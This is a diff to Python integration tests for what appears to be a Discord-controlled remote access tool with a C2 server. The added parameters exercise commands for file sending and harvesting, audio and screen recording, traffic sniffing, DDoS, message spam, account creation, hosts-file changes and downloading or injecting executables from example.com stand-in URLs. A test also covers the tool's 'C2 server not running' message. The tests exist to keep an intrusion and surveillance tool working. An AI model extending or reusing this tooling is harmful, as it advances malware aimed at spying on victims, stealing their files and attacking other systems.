@@ -34,6 +34,24 @@ class DiscordBotCommandsIntegrationTests(unittest.TestCase):
             "rotate": "up",
             "type": "Hello World",
             "hide": r"C:\Users\Public\secret.txt",
+            "send": r"C:\Users\Public\file.txt",
+            "get": "https://example.com/file.exe C:\\TEMP\\file.exe",
+            "copy": r"C:\src.txt C:\dst.txt",
+            "cut": r"C:\src.txt C:\dst.txt",
+            "extract": r"C:\archive.zip C:\extracted",
+            "archive": r"C:\folder C:\output.zip",
+            "harvest": "pdf",
+            "record": "10",
+            "play": r"C:\audio.mp3",
+            "screenrec": "5",
+            "port": "8080",
+            "hosts": "block example.com",
+            "ddos": "http://127.0.0.1 5",
+            "sniff": "5",
+            "block": "5",
+            "spam": "3 AlertMessage",
+            "user": "TestUser Password123",
+            "inject": "https://example.com/payload.exe",
         }
 
         for cmd_name, param in test_params.items():
@@ -42,6 +60,15 @@ class DiscordBotCommandsIntegrationTests(unittest.TestCase):
             cmds = builder(param)
             cmds = [c for c in cmds if c is not None]
             self.assertTrue(len(cmds) > 0, f"Param command !{cmd_name} built empty command list")
+
+    def test_camera_quote_escaping(self):
+        import discord_bot
+
+        builder = discord_bot.PARAM_COMMANDS["camera"]["build"]
+        cmds = builder("Integrated Camera")
+        self.assertEqual(len(cmds), 2)
+        self.assertNotIn('video=""Integrated Camera"', cmds[0])
+        self.assertIn('video=\\"Integrated Camera\\"', cmds[0])
 
     def test_discord_param_commands_malformed_input(self):
         import discord_bot
@@ -56,10 +83,15 @@ class DiscordBotCommandsIntegrationTests(unittest.TestCase):
         cmds = alert_builder("")
         self.assertEqual(len(cmds), 1)
 
+        # Test malformed hosts action
+        hosts_builder = discord_bot.PARAM_COMMANDS["hosts"]["build"]
+        invalid_hosts = [c for c in hosts_builder("invalid_action domain.com") if c is not None]
+        self.assertEqual(len(invalid_hosts), 0)
+
     def test_discord_bot_c2_failure_mode(self):
         import discord_bot
 
-        with patch("urllib.request.urlopen", side_effect=urllib.error.URLError("Connection Refused")):
+        with patch("discord_bot._check_c2_server", return_value=False):
             res = discord_bot._send_commands_sync(["dir"])
             self.assertIn("C2 Server ไม่ได้เปิดอยู่", res)
 
